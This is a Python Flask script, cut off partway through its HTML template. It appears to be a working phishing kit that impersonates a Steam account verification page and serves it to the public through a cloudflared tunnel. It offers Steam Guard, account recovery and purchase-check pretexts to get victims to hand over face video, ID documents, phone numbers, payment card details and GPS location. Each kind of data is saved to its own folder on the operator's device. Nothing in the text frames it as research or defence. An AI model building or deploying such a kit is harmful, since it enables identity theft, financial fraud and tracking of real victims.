import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_steam_username():
    """Generate a random Steam username."""
    prefixes = ["Cyber", "Shadow", "Neon", "Digital", "Virtual", "Pixel", "Code", "Ghost", 
                "Dark", "Light", "Iron", "Steel", "Mecha", "Tech", "Omega", "Alpha", "Zero"]
    
    suffixes = ["Warrior", "Hunter", "Slayer", "Master", "Lord", "Knight", "Samurai", "Ninja",
                "Wizard", "Mage", "Assassin", "Soldier", "Agent", "Pilot", "Commander", "Captain"]
    
    number = random.randint(1, 999)
    
    username_variants = [
        f"{random.choice(prefixes)}{random.choice(suffixes)}",
        f"{random.choice(prefixes)}{random.choice(suffixes)}{number}",
        f"{random.choice(prefixes)}_{random.choice(suffixes)}",
        f"The{random.choice(prefixes)}{random.choice(suffixes)}",
        f"xX{random.choice(prefixes)}{random.choice(suffixes)}Xx",
        f"{random.choice(prefixes).lower()}{random.choice(suffixes).lower()}",
        f"{random.choice(prefixes)}{number}",
        f"{random.choice(suffixes)}{number}"
    ]
    
    return random.choice(username_variants)

def generate_steam_profile_url():
    """Generate a Steam profile URL."""
    steam_ids = [
        "76561198123456789",
        "76561198234567890",
        "76561198345678901",
        "76561198456789012",
        "76561198567890123"
    ]
    return f"https://steamcommunity.com/profiles/{random.choice(steam_ids)}"

def generate_steam_level():
    """Generate a Steam level."""
    return random.randint(5, 200)

def generate_steam_games():
    """Generate random number of games."""
    return random.randint(10, 500)

def get_verification_settings():
    """Get user preferences for Steam verification process."""
    print("\n" + "="*60)
    print("STEAM VERIFICATION SETUP")
    print("="*60)
    
    # Get Steam username
    print("\n[+] STEAM ACCOUNT SETUP")
    print("Enter the Steam username to display")
    print("Leave blank for random username generation")
    
    username_input = input("Steam username (or press Enter for random): ").strip()
    if username_input:
        settings = {'steam_username': username_input}
    else:
        random_username = generate_steam_username()
        settings = {'steam_username': random_username}
        print(f"[+] Generated Steam username: {random_username}")
    
    # Generate Steam profile URL
    settings['steam_profile'] = generate_steam_profile_url()
    
    # Generate Steam level
    settings['steam_level'] = generate_steam_level()
    
    # Generate number of games
    settings['steam_games'] = generate_steam_games()
    
    # Generate Steam wallet balance
    wallet_balances = ["$0.00", "$5.42", "$12.67", "$25.89", "$50.34", "$100.75", "$250.50"]
    settings['steam_wallet'] = random.choice(wallet_balances)
    
    print(f"\n[+] Steam Level: {settings['steam_level']}")
    print(f"[+] Games Owned: {settings['steam_games']}")
    print(f"[+] Wallet Balance: {settings['steam_wallet']}")
    print(f"[+] Profile: {settings['steam_profile']}")
    
    # Verification type
    print("\n1. Steam Verification Type:")
    print("A - Steam Guard (Two-factor authentication)")
    print("B - Age Verification (Mature content)")
    print("C - Account Recovery (Suspicious activity)")
    print("D - Purchase Verification (Large transaction)")
    
    while True:
        vtype = input("Select type (A/B/C/D, default: A): ").strip().upper()
        if not vtype:
            vtype = 'A'
        if vtype in ['A', 'B', 'C', 'D']:
            if vtype == 'A':
                settings['verification_type'] = 'steam_guard'
                settings['title'] = "Steam Guard Verification"
                settings['reason'] = "Confirm your identity to access Steam features"
            elif vtype == 'B':
                settings['verification_type'] = 'age_verification'
                settings['title'] = "Age Verification Required"
                settings['reason'] = "Verify your age to access mature content"
            elif vtype == 'C':
                settings['verification_type'] = 'account_recovery'
                settings['title'] = "Account Recovery"
                settings['reason'] = "Secure your account after suspicious activity"
            else:
                settings['verification_type'] = 'purchase_verification'
                settings['title'] = "Purchase Verification"
                settings['reason'] = "Verify large purchase for security"
            break
        else:
            print("Please enter A, B, C, or D.")
    
    # Face verification
    if settings['verification_type'] in ['age_verification', 'account_recovery']:
        print("\n2. Face Verification:")
        print("Require face verification?")
        face_enabled = input("Enable face verification (y/n, default: y): ").strip().lower()
        settings['face_enabled'] = face_enabled in ['y', 'yes', '']
        
        if settings['face_enabled']:
            while True:
                try:
                    duration = input("Duration in seconds (5-20, default: 15): ").strip()
                    if not duration:
                        settings['face_duration'] = 15
                        break
                    duration = int(duration)
                    if 5 <= duration <= 20:
                        settings['face_duration'] = duration
                        break
                    else:
                        print("Please enter a number between 5 and 20.")
                except ValueError:
                    print("Please enter a valid number.")
    else:
        settings['face_enabled'] = False
    
    # ID verification
    if settings['verification_type'] in ['age_verification', 'account_recovery']:
        print("\n3. ID Verification:")
        print("Require ID document upload?")
        id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
        settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    else:
        settings['id_enabled'] = False
    
    # Phone verification (for Steam Guard)
    if settings['verification_type'] == 'steam_guard':
        print("\n4. Phone Verification:")
        print("Require phone verification?")
        phone_enabled = input("Enable phone verification (y/n, default: y): ").strip().lower()
        settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
    else:
        settings['phone_enabled'] = False
    
    # Payment verification (for purchase verification)
    if settings['verification_type'] == 'purchase_verification':
        print("\n5. Payment Verification:")
        print("Require payment verification?")
        payment_enabled = input("Enable payment verification (y/n, default: y): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['y', 'yes', '']
        
        if settings['payment_enabled']:
            purchase_amounts = ["$19.99", "$49.99", "$59.99", "$99.99", "$199.99"]
            settings['purchase_amount'] = random.choice(purchase_amounts)
            print(f"[+] Purchase amount: {settings['purchase_amount']}")
    else:
        settings['payment_enabled'] = False
    
    # Location verification
    print("\n6. Location Verification:")
    print("Require location verification?")
    location_enabled = input("Enable location verification (y/n, default: n): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes']
    
    return settings

# --- Location Processing Functions ---

geolocator = Nominatim(user_agent="steam_verification")

# Global settings and download folder
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Steam Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_verification'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'phone_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def process_and_save_location(data, session_id):
    """Process and save location data."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Get address information
        address_details = {}
        full_address = "Unknown"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Prepare structured data
        location_data = {
            "platform": "steam_verification",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "verification_data": {
                "steam_username": data.get('steam_username', 'unknown'),
                "verification_type": data.get('verification_type', 'unknown'),
                "purpose": data.get('purpose', 'unknown')
            }
        }
        
        # Save to file
        filename = f"steam_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Steam location data saved: {filename}")
        
    except Exception as e:
        print(f"Error processing location: {e}")

# --- Flask Application ---

app = Flask(__name__)

# Global settings
VERIFICATION_SETTINGS = {
    'steam_username': generate_steam_username(),
    'steam_profile': generate_steam_profile_url(),
    'steam_level': generate_steam_level(),
    'steam_games': generate_steam_games(),
    'steam_wallet': "$25.89",
    'verification_type': 'steam_guard',
    'title': "Steam Guard Verification",
    'reason': "Confirm your identity to access Steam features",
    'face_enabled': False,
    'face_duration': 15,
    'id_enabled': False,
    'phone_enabled': True,
    'payment_enabled': False,
    'purchase_amount': "$59.99",
    'location_enabled': False
}

def create_html_template(settings):
    """Creates the Steam verification template."""
    steam_username = settings['steam_username']
    steam_profile = settings['steam_profile']
    steam_level = settings['steam_level']
    steam_games = settings['steam_games']
    steam_wallet = settings['steam_wallet']
    verification_type = settings['verification_type']
    title = settings['title']
    reason = settings['reason']
    face_duration = settings.get('face_duration', 15)
    purchase_amount = settings.get('purchase_amount', "$59.99")
    
    # Steam colors
    colors = {
        'steam_blue': '#171a21',
        'steam_dark': '#1b2838',
        'steam_light': '#2a475e',
        'steam_accent': '#66c0f4',
        'steam_green': '#5c7e10',
        'steam_text': '#c7d5e0',
        'steam_muted': '#8f98a0'
    }
    
    # Steps based on verification type
    total_steps = 2  # Intro + Step 1
    
    if settings['face_enabled']:
        total_steps += 1
    
    if settings['id_enabled']:
        total_steps += 1
    
    if settings['phone_enabled']:
        total_steps += 1
    
    if settings['payment_enabled']:
        total_steps += 1
    
    if settings['location_enabled']:
        total_steps += 1
    
    total_steps += 1  # Processing step
    total_steps += 1  # Completion step
    
    # Fix for template formatting - use simpler conditionals
    step2_indicator = f'<div class="step" id="step2Indicator">\n<div class="step-number">2</div>\n<div class="step-label">{ "Steam Guard" if verification_type == "steam_guard" else ("Age Verify" if verification_type == "age_verification" else ("Account" if verification_type == "account_recovery" else "Payment")) }</div>\n</div>' if total_steps > 3 else ''
    
    step3_indicator = f'<div class="step" id="step3Indicator">\n<div class="step-number">3</div>\n<div class="step-label">{ "ID Verify" if settings["id_enabled"] else ("Phone" if settings["phone_enabled"] else "Location") }</div>\n</div>' if total_steps > 4 else ''
    
    step4_indicator = '<div class="step" id="step4Indicator">\n<div class="step-number">4</div>\n<div class="step-label">Complete</div>\n</div>' if total_steps > 5 else ''
    
    template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Steam - {title}</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --steam-blue: {colors['steam_blue']};
            --steam-dark: {colors['steam_dark']};
            --steam-light: {colors['steam_light']};
            --steam-accent: {colors['steam_accent']};
            --steam-green: {colors['steam_green']};
            --steam-text: {colors['steam_text']};
            --steam-muted: {colors['steam_muted']};
            --steam-border: #3d4450;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }}
        
        html, body {{
            height: 100%;
            overflow-x: hidden;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--steam-blue);
            color: var(--steam-text);
            line-height: 1.6;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }}
        
        .container {{
            max-width: 100%;
            margin: 0 auto;
            padding: 15px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }}
        
        /* Header */
        .header {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 0;
            border-bottom: 1px solid var(--steam-border);
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }}
        
        .steam-logo {{
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 22px;
            font-weight: 300;
            flex-shrink: 0;
        }}
        
        .logo-icon {{
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_light']});
            border-radius: 8px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
            flex-shrink: 0;
        }}
        
        .verification-badge {{
            background: var(--steam-green);
            color: white;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            flex-shrink: 0;
        }}
        
        /* Profile Card */
        .profile-card {{
            background: linear-gradient(135deg, {colors['steam_dark']}, {colors['steam_light']});
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--steam-border);
        }}
        
        .profile-header {{
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }}
        
        .profile-avatar {{
            width: 70px;
            height: 70px;
            border-radius: 8px;
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_light']});
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
            font-weight: 500;
            overflow: hidden;
            border: 2px solid var(--steam-accent);
            flex-shrink: 0;
        }}
        
        .profile-info h2 {{
            font-size: 20px;
            margin-bottom: 5px;
            color: white;
            word-break: break-word;
        }}
        
        .profile-info p {{
            color: var(--steam-muted);
            font-size: 13px;
            word-break: break-all;
        }}
        
        .profile-stats {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            padding-top: 15px;
            border-top: 1px solid var(--steam-border);
        }}
        
        .stat {{
            text-align: center;
            padding: 12px 8px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            border: 1px solid var(--steam-border);
        }}
        
        .stat-value {{
            font-size: 20px;
            font-weight: 500;
            color: var(--steam-accent);
            margin-bottom: 4px;
        }}
        
        .stat-label {{
            font-size: 11px;
            color: var(--steam-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
        
        /* Alert */
        .steam-alert {{
            background: linear-gradient(135deg, #1b2838, #2a475e);
            border: 1px solid var(--steam-border);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }}
        
        .steam-alert::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: var(--steam-accent);
        }}
        
        .alert-icon {{
            font-size: 28px;
            color: var(--steam-accent);
            margin-bottom: 12px;
        }}
        
        .alert-content h3 {{
            font-size: 18px;
            margin-bottom: 8px;
            color: white;
        }}
        
        .alert-content p {{
            font-size: 14px;
            line-height: 1.5;
        }}
        
        /* Steps */
        .steps-container {{
            margin-bottom: 30px;
            flex: 1;
        }}
        
        .step-indicator {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
            flex-wrap: nowrap;
            overflow-x: auto;
            padding-bottom: 10px;
            -webkit-overflow-scrolling: touch;
        }}
        
        .step-indicator::-webkit-scrollbar {{
            display: none;
        }}
        
        .step-indicator::before {{
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--steam-border);
            z-index: 1;
        }}
        
        .step {{
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
            min-width: 70px;
            flex-shrink: 0;
        }}
        
        .step-number {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: var(--steam-border);
            color: var(--steam-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            margin-bottom: 8px;
            border: 3px solid var(--steam-blue);
            transition: all 0.3s;
            font-size: 14px;
            flex-shrink: 0;
        }}
        
        .step-number.active {{
            background: var(--steam-accent);
            color: white;
            transform: scale(1.1);
        }}
        
        .step-number.completed {{
            background: var(--steam-green);
            color: white;
        }}
        
        .step-label {{
            font-size: 11px;
            color: var(--steam-muted);
            text-align: center;
            max-width: 70px;
            line-height: 1.3;
            word-break: break-word;
        }}
        
        .step-label.active {{
            color: var(--steam-accent);
            font-weight: 500;
        }}
        
        /* Step Content */
        .step-content {{
            display: none;
            animation: fadeIn 0.5s;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-content.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 22px;
            margin-bottom: 12px;
            font-weight: 300;
            color: white;
            line-height: 1.3;
        }}
        
        .step-description {{
            color: var(--steam-muted);
            margin-bottom: 25px;
            font-size: 15px;
            line-height: 1.5;
        }}
        
        /* Steam Guard Code */
        .guard-container {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            text-align: center;
            border: 1px solid var(--steam-border);
        }}
        
        .guard-code {{
            font-size: 42px;
            font-weight: 500;
            letter-spacing: 6px;
            color: var(--steam-accent);
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            line-height: 1.2;
        }}
        
        .code-input {{
            width: 100%;
            padding: 15px;
            background: var(--steam-dark);
            border: 2px solid var(--steam-border);
            border-radius: 6px;
            color: white;
            font-size: 18px;
            text-align: center;
            letter-spacing: 6px;
            font-family: 'Courier New', monospace;
            margin-bottom: 15px;
            -webkit-appearance: none;
            appearance: none;
        }}
        
        .code-input:focus {{
            outline: none;
            border-color: var(--steam-accent);
        }}
        
        /* Camera Section */
        .camera-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            text-align: center;
            border: 1px solid var(--steam-border);
        }}
        
        .camera-container {{
            width: 100%;
            max-width: 280px;
            height: 280px;
            margin: 0 auto 20px;
            border-radius: 8px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--steam-accent);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 180px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
        }}
        
        .timer {{
            font-size: 28px;
            font-weight: 500;
            color: var(--steam-accent);
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }}
        
        /* ID Upload */
        .upload-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 2px dashed var(--steam-border);
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            touch-action: manipulation;
        }}
        
        .upload-section:hover, .upload-section:active {{
            border-color: var(--steam-accent);
            background: rgba(102, 192, 244, 0.1);
        }}
        
        .upload-icon {{
            font-size: 42px;
            color: var(--steam-accent);
            margin-bottom: 15px;
        }}
        
        /* Phone Verification */
        .phone-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 1px solid var(--steam-border);
        }}
        
        .phone-input {{
            width: 100%;
            padding: 15px;
            background: var(--steam-dark);
            border: 2px solid var(--steam-border);
            border-radius: 6px;
            color: white;
            font-size: 16px;
            margin-bottom: 15px;
            -webkit-appearance: none;
            appearance: none;
        }}
        
        /* Payment Section */
        .payment-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 1px solid var(--steam-border);
        }}
        
        .payment-amount {{
            font-size: 32px;
            color: var(--steam-accent);
            text-align: center;
            margin: 15px 0;
            font-weight: 500;
        }}
        
        .form-group {{
            margin-bottom: 15px;
        }}
        
        .form-label {{
            display: block;
            margin-bottom: 6px;
            color: var(--steam-text);
            font-weight: 500;
            font-size: 14px;
        }}
        
        .form-input {{
            width: 100%;
            padding: 12px;
            background: var(--steam-dark);
            border: 2px solid var(--steam-border);
            border-radius: 6px;
            color: white;
            font-size: 16px;
            -webkit-appearance: none;
            appearance: none;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: var(--steam-accent);
        }}
        
        .card-details {{
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
        }}
        
        /* Buttons */
        .btn {{
            display: inline-block;
            padding: 16px 24px;
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_light']});
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
            width: 100%;
            touch-action: manipulation;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }}
        
        .btn:hover, .btn:active {{
            background: linear-gradient(135deg, #5cb0e8, #295a7a);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(102, 192, 244, 0.3);
        }}
        
        .btn:active {{
            transform: translateY(0);
        }}
        
        .btn:disabled {{
            background: var(--steam-border);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            opacity: 0.7;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .btn-outline {{
            background: transparent;
            border: 2px solid var(--steam-border);
            color: var(--steam-text);
            padding: 14px 24px;
        }}
        
        .btn-outline:hover, .btn-outline:active {{
            background: rgba(255, 255, 255, 0.1);
            border-color: var(--steam-accent);
            color: var(--steam-accent);
        }}
        
        .button-group {{
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 25px;
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 12px 15px;
            border-radius: 6px;
            margin: 15px 0;
            text-align: center;
            border: 1px solid;
            font-size: 14px;
            line-height: 1.4;
        }}
        
        .status-success {{
            background: rgba(92, 126, 16, 0.2);
            color: #a3cf33;
            border-color: var(--steam-green);
        }}
        
        .status-error {{
            background: rgba(255, 60, 60, 0.2);
            color: #ff6b6b;
            border-color: #ff3c3c;
        }}
        
        .status-processing {{
            background: rgba(102, 192, 244, 0.2);
            color: var(--steam-accent);
            border-color: var(--steam-accent);
        }}
        
        /* Loading Spinner */
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Info Box */
        .info-box {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            padding: 18px;
            margin: 15px 0;
            border-left: 4px solid var(--steam-accent);
        }}
        
        .info-box h4 {{
            color: var(--steam-accent);
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 16px;
        }}
        
        .info-box ul {{
            padding-left: 20px;
            margin-top: 8px;
        }}
        
        .info-box li {{
            margin-bottom: 5px;
            font-size: 14px;
            line-height: 1.4;
        }}
        
        /* Completion Screen */
        .completion-screen {{
            text-align: center;
            padding: 40px 15px;
        }}
        
        .success-icon {{
            width: 70px;
            height: 70px;
            background: var(--steam-green);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            margin: 0 auto 25px;
        }}
        
        .steam-verified {{
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_green']});
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 24px;
            font-weight: 500;
            margin: 15px 0;
            line-height: 1.3;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            padding: 25px 0;
            border-top: 1px solid var(--steam-border);
            margin-top: 30px;
            color: var(--steam-muted);
            font-size: 13px;
            flex-shrink: 0;
        }}
        
        .footer-links {{
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 12px;
        }}
        
        .footer-links a {{
            color: var(--steam-accent);
            text-decoration: none;
            font-size: 12px;
            white-space: nowrap;
        }}
        
        .footer-links a:hover, .footer-links a:active {{
            text-decoration: underline;
        }}
        
        /* Mobile Optimization */
        @media (max-width: 768px) {{
            .container {{
                padding: 12px;
            }}
            
            .header {{
                flex-direction: column;
                text-align: center;
                gap: 12px;
            }}
            
            .steam-logo {{
                font-size: 20px;
            }}
            
            .verification-badge {{
                font-size: 11px;
                padding: 5px 10px;
            }}
            
            .profile-header {{
                flex-direction: column;
                text-align: center;
                gap: 12px;
            }}
            
            .profile-avatar {{
                width: 60px;
                height: 60px;
                font-size: 24px;
            }}
            
            .profile-info h2 {{
                font-size: 18px;
            }}
            
            .profile-stats {{
                grid-template-columns: repeat(3, 1fr);
                gap: 8px;
            }}
            
            .stat {{
                padding: 10px 6px;
            }}
            
            .stat-value {{
                font-size: 18px;
            }}
            
            .stat-label {{
                font-size: 10px;
            }}
            
            .step-indicator {{
                margin-bottom: 25px;
            }}
            
            .step {{
                min-width: 60px;
            }}
            
            .step-number {{
                width: 32px;
                height: 32px;
                font-size: 13px;
            }}
            
            .step-label {{
                font-size: 10px;
                max-width: 60px;
            }}
            
            .camera-container {{
                max-width: 250px;
                height: 250px;
            }}
            
            .face-circle {{
                width: 160px;
                height: 160px;
            }}
            
            .guard-code {{
                font-size: 36px;
                letter-spacing: 5px;
            }}
            
            .payment-amount {{
                font-size: 28px;
            }}
            
            .steam-verified {{
                font-size: 22px;
            }}
        }}
        
        @media (max-width: 480px) {{
            .container {{
                padding: 10px;
            }}
            
            .profile-stats {{
                grid-template-columns: repeat(3, 1fr);
                gap: 6px;
            }}
            
            .stat {{
                padding: 8px 4px;
            }}
            
            .stat-value {{
                font-size: 16px;
            }}
            
            .stat-label {{
                font-size: 9px;
            }}
            
            .step {{
                min-width: 55px;
            }}
            
            .step-number {{
                width: 28px;
                height: 28px;
                font-size: 12px;
            }}
            
            .step-label {{
                font-size: 9px;
                max-width: 55px;
            }}
            
            .camera-container {{
                max-width: 220px;
                height: 220px;
            }}
            
            .face-circle {{
                width: 140px;
                height: 140px;
            }}
            
            .guard-code {{
                font-size: 32px;
                letter-spacing: 4px;
            }}
            
            .timer {{
                font-size: 24px;
            }}
            
            .btn {{
                padding: 14px 20px;
                font-size: 15px;
            }}
            
            .btn-outline {{
                padding: 12px 20px;
            }}
        }}
        
        @media (max-width: 360px) {{
            .profile-stats {{
                grid-template-columns: 1fr;
                gap: 8px;
            }}
            
            .step {{
                min-width: 50px;
            }}
            
            .step-number {{
                width: 26px;
                height: 26px;
                font-size: 11px;
            }}
            
            .step-label {{
                font-size: 8px;
                max-width: 50px;
            }}
            
            .camera-container {{
                max-width: 200px;
                height: 200px;
            }}
            
            .face-circle {{
                width: 120px;
                height: 120px;
            }}
            
            .guard-code {{
                font-size: 28px;
                letter-spacing: 3px;
            }}
        }}
        
        /* Prevent zoom on input focus on mobile */
        @media (max-width: 768px) {{
            input, textarea, select {{
                font-size: 16px !important;
            }}
        }}
        
        /* Fix for iOS Safari */
        @supports (-webkit-touch-callout: none) {{
            body {{
                min-height: -webkit-fill-available;
            }}
            
            .container {{
                min-height: -webkit-fill-available;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="steam-logo">
                <div class="logo-icon">S</div>
                <span>Steam</span>
            </div>
            <div class="verification-badge">
                {title}
            </div>
        </div>
        
        <!-- Profile Card -->
        <div class="profile-card">
            <div class="profile-header">
                <div class="profile-avatar">
                    {steam_username[0].upper()}
                </div>
                <div class="profile-info">
                    <h2>{steam_username}</h2>
                    <p>Steam Account • {steam_profile}</p>
                </div>
            </div>
            
            <div class="profile-stats">
                <div class="stat">
                    <div class="stat-value">{steam_level}</div>
                    <div class="stat-label">Steam Level</div>
                </div>
                <div class="stat">
                    <div class="stat-value">{steam_games}</div>
                    <div class="stat-label">Games Owned</div>
                </div>
                <div class="stat">
                    <div class="stat-value">{steam_wallet}</div>
                    <div class="stat-label">Wallet Balance</div>
                </div>
            </div>
        </div>
        
        <!-- Alert -->
        <div class="steam-alert">
            <div class="alert-icon">⚠️</div>
            <div class="alert-content">
                <h3>Verification Required</h3>
                <p>{reason}</p>
            </div>
        </div>
        
        <!-- Step Indicator -->
        <div class="steps-container">
            <div class="step-indicator">
                <div class="step">
                    <div class="step-number active">1</div>
                    <div class="step-label active">Start</div>
                </div>
                {step2_indicator}
                {step3_indicator}
                {step4_indicator}
                <div class="step">
                    <div class="step-number">✓</div>
                    <div class="step-label">Finish</div>
                </div>
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step-content active" id="step1">
                <h2 class="step-title">{title}</h2>
                <p class="step-description">
                    Steam needs to verify your identity to ensure account security and prevent unauthorized access.
                    {'This is required for Steam Guard two-factor authentication.' if verification_type == 'steam_guard' else ''}
                    {'Age verification is required to access mature content.' if verification_type == 'age_verification' else ''}
                    {'Account recovery verification is required after suspicious activity was detected.' if verification_type == 'account_recovery' else ''}
                    {'Purchase verification is required for security reasons.' if verification_type == 'purchase_verification' else ''}
                </p>
                
                <div class="info-box">
                    <h4>Why this is required:</h4>
                    <ul>
                        <li>Protect your Steam account and games library</li>
                        <li>Secure your payment information and wallet</li>
